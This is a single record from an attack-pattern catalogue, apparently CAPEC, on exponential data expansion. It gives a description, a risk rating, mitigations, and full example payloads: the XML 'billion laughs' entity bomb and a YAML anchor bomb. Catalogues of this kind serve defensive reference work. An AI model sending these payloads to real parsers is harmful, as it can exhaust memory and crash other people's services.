197,Exponential Data Expansion,"An adversary submits data to a target application which contains nested exponential data expansion to produce excessively large output. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.",High,Medium,"::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::","::The most common example of this type of attack is the many laughs attack (sometimes called the 'billion laughs' attack). For example: <?xml version=1.0?><!DOCTYPE lolz [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;><!ENTITY lol3 &lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;><!ENTITY lol4 &lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;><!ENTITY lol5 &lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;><!ENTITY lol6 &lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;><!ENTITY lol7 &lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6><!ENTITY lol8 &lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;><!ENTITY lol9 &lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;> ]><lolz>&lol9;</lolz> This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.::This example is similar, but uses YAML. This was used to attack Kubernetes [REF-686] a: &a [lol,lol,lol,lol,lol,lol,lol,lol,lol]b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]::"
